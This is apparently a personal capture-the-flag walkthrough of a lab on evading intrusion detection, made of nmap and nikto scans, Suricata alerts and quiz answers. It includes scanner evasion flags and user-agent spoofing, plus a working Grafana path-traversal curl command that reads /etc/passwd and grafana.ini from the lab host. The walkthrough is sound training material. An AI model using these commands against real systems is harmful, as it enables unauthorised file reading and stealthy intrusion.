SF:WVzc2FnZSIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ\.Y-1L
SF:Yw\.JV_yJVJc5vqYrEryY2aRQ7-fHMM;\x20HttpOnly;\x20Path=/\r\n\r\n<!DOCTYP
SF:E\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<
SF:title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20
SF:should\x20be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20
SF:<a\x20href=\"/login\?next=%2F\">/login\?next=%2F</a>\.\x20If\x20not\x20
SF:click\x20the\x20link\.")%r(FourOhFourRequest,336,"HTTP/1\.0\x20404\x20N
SF:OT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x2015\x20Feb\x20202
SF:3\x2021:15:21\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/h
SF:tml;\x20charset=utf-8\r\nContent-Length:\x20661\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"U
SF:TF-8\">\n\x20\x20\x20\x20<meta\x20http-equiv=\"X-UA-Compatible\"\x20con
SF:tent=\"IE=edge\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20conten
SF:t=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<titl
SF:e>File\x20Not\x20Found\x20\|\x20Advanced\x20CTF\x20Scoring\x20System</t
SF:itle>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/st
SF:yles/master\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n<main>\n\x20\x2
SF:0\x20\x20<div\x20class=\"error_card\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<h1>Not\x20Found</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20The\x20requested\x20URL\x20was\x2
SF:0not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x
SF:20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\
SF:x20again\.\x20Click\x20<a\x20href=\"/index\">here</a>\x20to\x20return\x
SF:20to\x20the\x20home\x20page\.\n\x20\x20\x20\x20\x20\x20\x20\x20</p>\n\x
SF:20\x20\x20\x20</div>\n</main>\n\n</body>\n</html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.58 seconds

Alert Details

    Alert ID: 27579
    Alert Timestamp: .949554
    Source IP: 10.8.19.103
    Affected Asset: 172.200.0.30
    Alert Description: ET SCAN Nmap Scripting Engine User-Agent Detected (Nmap Scripting Engine)
    Alert Category: Unknown Classtype
    Alert Severity: 3
    Alert Score: 5.33

┌──(witty㉿kali)-[~/Downloads]
└─$ nmap -sV --script-args http.useragent="Mozilla/5.0 (X11, AmigaOS x86_64) (KHTML, somewhat like Gecko) Netscape/5000" 10.10.133.96
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.10.133.96
Host is up (0.19s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
3000/tcp open  ppp?
8000/tcp open  http-alt gunicorn
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.93%I=7%D=2/15%Time=63ED4F1B%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Contro
SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
SF:ion:\x201;\x20mode=block\r\nDate:\x20Wed,\x2015\x20Feb\x202023\x2021:31
SF::07\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found<
SF:/a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20We
SF:d,\x2015\x20Feb\x202023\x2021:31:13\x20GMT\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
SF:\x20mode=block\r\nDate:\x20Wed,\x2015\x20Feb\x202023\x2021:31:41\x20GMT
SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
SF:);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.93%I=7%D=2/15%Time=63ED4F1B%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,11E,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\nContent-Type:\x20text/html\r\nContent-Length:\x20193\r\n\r\n<htm
SF:l>\n\x20\x20<head>\n\x20\x20\x20\x20<title>Bad\x20Request</title>\n\x20
SF:\x20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p><
SF:/h1>\n\x20\x20\x20\x20Invalid\x20Request\x20Line\x20&#x27;Invalid\x20HT
SF:TP\x20request\x20line:\x20&#x27;&#x27;&#x27;\n\x20\x20</body>\n</html>\
SF:n")%r(GetRequest,26E,"HTTP/1\.0\x20302\x20FOUND\r\nServer:\x20gunicorn\
SF:r\nDate:\x20Wed,\x2015\x20Feb\x202023\x2021:31:07\x20GMT\r\nConnection:
SF:\x20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Le
SF:ngth:\x20236\r\nLocation:\x20http://0\.0\.0\.0:8000/login\?next=%2F\r\n
SF:Vary:\x20Cookie\r\nSet-Cookie:\x20session=eyJfZmxhc2hlcyI6W3siIHQiOlsib
SF:WVzc2FnZSIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ\.Y-1P
SF:Gw\.lucQh1xj1SuXqCle58GrFz8o-2c;\x20HttpOnly;\x20Path=/\r\n\r\n<!DOCTYP
SF:E\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<
SF:title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20
SF:should\x20be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20
SF:<a\x20href=\"/login\?next=%2F\">/login\?next=%2F</a>\.\x20If\x20not\x20
SF:click\x20the\x20link\.")%r(FourOhFourRequest,336,"HTTP/1\.0\x20404\x20N
SF:OT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x2015\x20Feb\x20202
SF:3\x2021:31:13\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/h
SF:tml;\x20charset=utf-8\r\nContent-Length:\x20661\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"U
SF:TF-8\">\n\x20\x20\x20\x20<meta\x20http-equiv=\"X-UA-Compatible\"\x20con
SF:tent=\"IE=edge\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20conten
SF:t=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<titl
SF:e>File\x20Not\x20Found\x20\|\x20Advanced\x20CTF\x20Scoring\x20System</t
SF:itle>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/st
SF:yles/master\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n<main>\n\x20\x2
SF:0\x20\x20<div\x20class=\"error_card\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<h1>Not\x20Found</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20The\x20requested\x20URL\x20was\x2
SF:0not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x
SF:20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\
SF:x20again\.\x20Click\x20<a\x20href=\"/index\">here</a>\x20to\x20return\x
SF:20to\x20the\x20home\x20page\.\n\x20\x20\x20\x20\x20\x20\x20\x20</p>\n\x
SF:20\x20\x20\x20</div>\n</main>\n\n</body>\n</html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.28 seconds

--script=vuln

give lot of alerts from suricata
Alert Details

    Alert ID: 27855
    Alert Timestamp: .037712
    Source IP: 10.8.19.103
    Affected Asset: 172.200.0.10
    Alert Description: ET WEB_SERVER /etc/shadow Detected in URI
    Alert Category: Unknown Classtype
    Alert Severity: 3
    Alert Score: 2.67

Alert Details

    Alert ID: 27936
    Alert Timestamp: .512066
    Source IP: 10.8.19.103
    Affected Asset: 172.200.0.10
    Alert Description: ET EXPLOIT Possible ZyXELs ZynOS Configuration Download Attempt (Contains Passwords)
    Alert Category: Unknown Classtype
    Alert Severity: 3
    Alert Score: 2.67

┌──(witty㉿kali)-[~/Downloads]
└─$ nmap --script=vuln --script-args http.useragent="Mozilla/5.0 (X11, AmigaOS x86_64) (KHTML, somewhat like Gecko) Netscape/5000" 10.10.133.96
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.10.133.96
Host is up (0.25s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
3000/tcp open  ppp
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 957.15 seconds
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ nmap -sS 10.10.133.96
You requested a scan type which requires root privileges.
QUITTING!
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo nmap -sS 10.10.133.96
[sudo] password for witty: 
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.10.133.96
Host is up (0.23s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 3.64 seconds

IDS Details

    IDS Name: Suricata
    IDS Reliability: 8
    IDS Severity Range: 1-3*

    *Note that, Suricata inverts the normal severity scale so an alert with a severity of 1 is, the most critical whereas, an alert with severity of 3 is not important. The scoring system does account for this.

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
3000/tcp open  ppp?
8000/tcp open  http-alt gunicorn

so 3 services identified (OpenSSH, Apache, gunicorn)

Gunicorn "Green Unicorn" es un servidor HTTP de interfaz de puerta de enlace de servidor web Python. Es un modelo de trabajador previo a la bifurcación, portado del proyecto Unicornio de Ruby.
```
![[Pasted image 20230215165210.png]]
What scale is used to measure alert severity in Suricata? (*-*)
The scoring system normalises alert severity scales from different IDS. And details on each of the attached IDS is available on the alert breakdown page.
*1-3*
How many services is nmap able to fully recognise when the service scan (-sV) is performed?
nmap uses fingerprinting to detect and version services, these are not always completely reliable.
*3*
Of course, `nmap` is not the only tool that features IDS evasion tools. As an example the web-scanner `nikto` also features a number of options that we will experiment with within this task, where we perform more aggressive scans to enumerate the services we have already discovered. In general, `nikto` is a much more aggressive scanner than `nmap` and is thus harder to conceal; however, these more aggressive scans can return more useful information in some cases. Let's start by running `nikto` with the minimum options:
`nikto -p 80,3000 -h 10.10.133.96`
Note, that we need to specify that we want to scan both of the web-services present on the device and not just the business website. This should return some useful information but also generate a huge number of alerts about, 7000 of them in total.  Let's run through some simple options to reduce this. The first step would probably be to stop scanning the business website at all, have a look around, do you see any evidence of interactive elements or a web application framework? Static sites do not generate many vulnerabilities on their own so it's probably best to consider that attack vector closed for now. Remember, `nikto` is a pure web scanner and will not search other services for actor vectors. We can update the command like so:
`nikto -p 3000 -h 10.10.133.96`
Next, we should consider that `nikto`will search every possible category of vulnerability by default. This usually isn't necessary in the real world or in a CTF where options like denial of service attacks aren't that helpful or even counterproductive, lets's update the command to reflect this, in this case, I've asked `nikto` to only check for; interesting files, misconfiguration, and information disclosure. A full list of tuning options is available in the help screen`(-H)`, I recommend that you experiment with different combinations and make note of the resultant information.
`nikto -p 3000 -T 1 2 3 -h 10.10.133.96`
You should also notice, that the scan was executed a lot quicker than the previous scans keep this in mind for future CTFs, there are benefits to putting extra configuration work in beyond keeping a low profile. Finally, we should consider the evasion options available with `nikto`. First, let's make sure that a more appropriative User-Agent is used as again, the default one is not designed to be stealthy, you'll find that this is a common theme across many different scanners:
`nikto -p3000 -T 1 2 3 -useragent <AGENT_HERE> -h 10.10.133.96`
This should make the scan a little more subtle. In theory, we could also go further and use a selection of the IDS evasion modes available with `nikto` these are set with the `-e` flag:
`nikto -p3000 -T 1 2 3 -useragent <AGENT_HERE> -e 1 7 -h 10.10.133.96`
In this case, I've set two evasion options; random URL encoding and random URL casing, try running the scan now. Once the scan completes you should see that the number of IDS alerts generated by the scan have actually increased following the addition of the evasion technique flags.  Modern NIDS like, Suricata are also capable of detecting unusual data in packets like unexpected character and invalid headers and so, by activating the evasion techniques we've increased the detectability of our scan as it now also features broken HTTP headers as well as known exploits.
There are also more complex evasion options beyond clever usage of certain web scanner features; however, many of these options require additional resources that may simply not be available in or outside of a CTF environment. For example, if you were to somehow gain access to a large enough botnet it may be possible to simply overwhelm the target IDS or IDS operators by flooding the system with alerts from many hosts and attack vectors and thus conceal the real attack. This strategy may also simply crash any IDS that's protecting the service if enough packets are sent though, most IDS use some form of throughput limiter. In fact, I've adjusted the limiter in Wazuh to output as fast as possible for this CTF otherwise, it would take too long to process all of the alerts generated by aggressive scans.
More practical options from the field of open-source intelligence may also be available and will be covered in the next task.
Answer the questions below
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ nikto -p 80,3000 -h 10.10.133.96
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.133.96
+ Target Hostname:    10.10.133.96
+ Target Port:        80
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 5e7, size: 5db579800d8b8, mtime: gzip
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
^C  

┌──(witty㉿kali)-[~/Downloads]
└─$ nikto -p 3000 -h 10.10.133.96
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.133.96
+ Target Hostname:    10.10.133.96
+ Target Port:        3000
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Root page / redirects to: /login
+ No CGI Directories found (use '-C all' to force check all possible dirs)
^C 

┌──(witty㉿kali)-[~/Downloads]
└─$ nikto -H                     

   Options:
       -ask+               Whether to ask about submitting updates
                               yes   Ask about each (default)
                               no    Don't ask, don't send
                               auto  Don't ask, just send
       -Cgidirs+           Scan these CGI dirs: "none", "all", or values like "/cgi/ /cgi-a/"
       -config+            Use this config file
       -Display+           Turn on/off display outputs:
                               1     Show redirects
                               2     Show cookies received
                               3     Show all 200/OK responses
                               4     Show URLs which require authentication
                               D     Debug output
                               E     Display all HTTP errors
                               P     Print progress to STDOUT
                               S     Scrub output of IPs and hostnames
                               V     Verbose output
       -dbcheck           Check database and other key files for syntax errors
       -evasion+          Encoding technique:
                               1     Random URI encoding (non-UTF8)
                               2     Directory self-reference (/./)
                               3     Premature URL ending
                               4     Prepend long random string
                               5     Fake parameter
                               6     TAB as request spacer
                               7     Change the case of the URL
                               8     Use Windows directory separator (\)
                               A     Use a carriage return (0x0d) as a request spacer
                               B     Use binary value 0x0b as a request spacer
        -Format+           Save file (-o) format:
                               csv   Comma-separated-value
                               json  JSON Format
                               htm   HTML Format
                               nbe   Nessus NBE format
                               sql   Generic SQL (see docs for schema)
                               txt   Plain text
                               xml   XML Format
                               (if not specified the format will be taken from the file extension passed to -output)
       -Help              Extended help information
       -host+             Target host/URL
       -404code           Ignore these HTTP codes as negative responses (always). Format is "302,301".
       -404string         Ignore this string in response body content as negative response (always). Can be a regular expression.
       -id+               Host authentication to use, format is id:pass or id:pass:realm
       -key+              Client certificate key file
       -list-plugins      List all available plugins, perform no testing
       -maxtime+          Maximum testing time per host (e.g., 1h, 60m, 3600s)
       -mutate+           Guess additional file names:
                               1     Test all files with all root directories
                               2     Guess for password file names
                               3     Enumerate user names via Apache (/~user type requests)
                               4     Enumerate user names via cgiwrap (/cgi-bin/cgiwrap/~user type requests)
                               5     Attempt to brute force sub-domain names, assume that the host name is the parent domain
                               6     Attempt to guess directory names from the supplied dictionary file
       -mutate-options    Provide information for mutates
       -nointeractive     Disables interactive features
       -nolookup          Disables DNS lookups
       -nossl             Disables the use of SSL
       -no404             Disables nikto attempting to guess a 404 page
       -Option            Over-ride an option in nikto.conf, can be issued multiple times
       -output+           Write output to this file ('.' for auto-name)
       -Pause+            Pause between tests (seconds, integer or float)
       -Plugins+          List of plugins to run (default: ALL)
       -port+             Port to use (default 80)
       -RSAcert+          Client certificate file
       -root+             Prepend root value to all requests, format is /directory
       -Save              Save positive responses to this directory ('.' for auto-name)
       -ssl               Force ssl mode on port
       -Tuning+           Scan tuning:
                               1     Interesting File / Seen in logs
                               2     Misconfiguration / Default File
                               3     Information Disclosure
                               4     Injection (XSS/Script/HTML)
                               5     Remote File Retrieval - Inside Web Root
                               6     Denial of Service
                               7     Remote File Retrieval - Server Wide
                               8     Command Execution / Remote Shell
                               9     SQL Injection
                               0     File Upload
                               a     Authentication Bypass
                               b     Software Identification
                               c     Remote Source Inclusion
                               d     WebService
                               e     Administrative Console
                               x     Reverse Tuning Options (i.e., include all except specified)
       -timeout+          Timeout for requests (default 10 seconds)
       -Userdbs           Load only user databases, not the standard databases
                               all   Disable standard dbs and load only user dbs
                               tests Disable only db_tests and load udb_tests
       -useragent         Over-rides the default useragent
       -until             Run until the specified time or duration
       -update            Update databases and plugins from CIRT.net
       -url+              Target host/URL (alias of -host)
       -useproxy          Use the proxy defined in nikto.conf, or argument http://server:port
       -Version           Print plugin and database versions
       -vhost+            Virtual host (for Host header)
   		+ requires a value

┌──(witty㉿kali)-[~/Downloads]
└─$ nikto -p 3000 -T 1 2 3 -useragent "Mozilla/5.0 (X11, AmigaOS x86_64) (KHTML, somewhat like Gecko) Netscape/5000" -e 1 7 -h 10.10.3.55  
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.3.55
+ Target Hostname:    10.10.3.55
+ Target Port:        3000
+ Using Encoding:     Random URI encoding (non-UTF8)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Root page / redirects to: /login
^C
```
Nikto, should find an interesting path when the first scan is performed, what is it called?
*/login*
What value is used to toggle denial of service vectors when using scan tuning (-T) in nikto?
You can access the full content of the help screen with the (-H) flag
*6*
Which flags are used to modify the request spacing in nikto? Use commas to separate the flags in your answer.
These are all in the evasion category
*6,A,B*
### Open-source Intelligence
Continuing, from the sonar analogy from earlier, if `nmap` and other scanners are active sonar, then open-source intelligence or OSINT is passive sonar as intelligence is gained not from active probes but from "listening" to the information that the target freely distributes or by, acquiring information from sources discontented from the target.
Most forms of OSINT are affectivity undetectable and thus are extremely effective against IDS however, there are limitations as by its nature, OSINT relies on the target to disclose information which, may not happen if the target isn't publicly available or is designed to reduce data disclosure. A good example of this is the [Wireguard](https://www.wireguard.com/protocol/#dos-mitigation) VPN protocol which will not respond to queries unless they come from an authenticated source making, it invisible to third-party scan sites like shodan.
In terms of information that can be gathered from third parties the following sources may be available as a starting point:
-   Information on the services active on a node can be acquired with tools like Shodan.
-   Additional resources may be found using search engines and advanced tags like :site, :filetype or :title.
-   Subdomains and related IP addresses may be found using online scanners or tools like`recon-ng`; a poorly chosen subdomain may also reveal information about the target even if it is protected behind a firewall.
-   ASN and WHOIS queries may reveal what provider is responsible for hosting the site.
Information may also be gathered from the target site and related assets if they are publicly available including:
-   The technologies used to host the site may be acquired from error pages, file extensions, debug pages, or the server tag used in an HTTP response
-   Additional information on the tools used by the target may be available in job listings
For this demo, have a look around the "public" facing site and see how much information you can acquire.
Answer the questions below
Now, that an initial foothold has been established it's time to discuss how IDS can track privilege escalation. This is primarily a task for HIDS as many post-exploitation tasks like, privilege escalation do not require communication with the outside world and are hard or impossible to detect with a NIDS. In fact, privilege escalation is our first task as we are not yet root. The first step in privilege escalation is usually checking what permissions we currently have this, could save us a lot of work if we're already in the sudo group. There are a few different ways to check this including:
-   `sudo -l` this will return a list of all the commands that an account can run with elevated permissions via `sudo`
-   `groups` will list all of the groups that the current user is a part of.
-   `cat /etc/group` should return a list of all of the groups on the system and their members. This can help in locating users with higher access privileges and not just our own.
Run all of these commands and note which ones create an IDS alert, Suricata will be blind to all of this as none of these commands create network activity. It is also possible to check this and more with a script like [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), so far every time we've used a script it has tended to be the source of more information but an increase in alerts. However, this is not always the case. Run `linpeas` on the system now and take note of how many alerts are created, in relation to the large amount of reconnaissance it performs.
Of course, this activity isn't completely invisible as `linpeas` would likely be detected by an antivirus if one was installed though, there are ways to reduce its footprint. There is also the question of transporting the script to the target system, Suricata is capable of detecting when scripts are downloaded via `wget`  , however, TLS restricts its ability to actually detect the traffic without the deployment of web proxy servers. It may also be possible to simply copy and paste the script's content however, most HIDS implement some form of file system integrity monitoring which would detect the addition of the script even if an antivirus was not installed, more on this later.
Either way, `linpeas` should be able to identify a potential privilege escalation vector.
Answer the questions below

## Exploitation
```text
http://10.10.3.55:3000/login

Documentation
Support
Community Open Source v8.2.5 (b57a137ac)

https://www.exploit-db.com/exploits/50581

┌──(witty㉿kali)-[~/Downloads]
└─$ curl --path-as-is http://10.10.3.55:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
syslog:x:105:106::/home/syslog:/usr/sbin/nologin
ossec:x:106:108::/var/ossec:/sbin/nologin
grafana:x:107:109::/usr/share/grafana:/bin/false

┌──(witty㉿kali)-[~/Downloads]
└─$ curl --path-as-is http://10.10.3.55:3000/public/plugins/alertlist/../../../../../../../../../../etc/grafana/grafana.ini   
##################### Grafana Configuration Example #####################
#
```
```text
# Everything has defaults so you only need to uncomment things you want to
```
```text
# change
```
```text
# possible values : production, development
;app_mode = production
```
```text
# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}

#################################### Paths ####################################
[paths]
```
```text
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana
```
```text
# Temporary files in `data` directory older than given duration will be removed
;temp_data_lifetime = 24h
```
```text
# Directory where grafana can store logs
;logs = /var/log/grafana
```
```text
# Directory where grafana will automatically scan and look for plugins
;plugins = /var/lib/grafana/plugins
```
```text
# folder that contains provisioning config files that grafana will apply on startup and while running.
;provisioning = conf/provisioning

#################################### Server ####################################
[server]
```
```text
# Protocol (http, https, h2, socket)
;protocol = http
```
```text
# The ip address to bind to, empty will bind to all interfaces
;http_addr =
```
```text
# The http port  to use
;http_port = 3000
```
```text
# The public facing domain name used to access grafana from a browser
;domain = localhost
```
```text
# Redirect to correct domain if host header does not match domain
```
```text
# Prevents DNS rebinding attacks
;enforce_domain = false
```
```text
# The full public facing url you use in browser, used for redirects and emails
```
```text
# If you use reverse proxy and sub path specify full url (with sub path)
;root_url = %(protocol)s://%(domain)s:%(http_port)s/
```
```text
# Serve Grafana from subpath specified in `root_url` setting. By default it is set to `false` for compatibility reasons.
;serve_from_sub_path = false
```
```text
# Log web requests
;router_logging = false
```
```text
# the path relative working path
;static_root_path = public
```
```text
# enable gzip
;enable_gzip = false
```
```text
# https certs & key file
;cert_file =
;cert_key =
```
```text
# Unix socket path
;socket =
```
```text
# CDN Url
;cdn_url =
```
```text
# Sets the maximum time using a duration format (5s/5m/5ms) before timing out read of an incoming request and closing idle connections.
```
```text
# `0` means there is no timeout for reading the request.
;read_timeout = 0

#################################### Database ####################################
[database]
```
```text
# You can configure the database connection by specifying type, host, name, user and password
```
```text
# as separate properties or as on string using the url properties.
```
```text
# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
```
```text
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =
```
```text
# Use either URL or the previous fields to configure the database
```
```text
# Example: mysql://user:secret@host:port/database
;url =
```
```text
# For "postgres" only, either "disable", "require" or "verify-full"
;ssl_mode = disable
```
```text
# Database drivers may support different transaction isolation levels.
```
```text
# Currently, only "mysql" driver supports isolation levels.
```
```text
# If the value is empty - driver's default isolation level is applied.
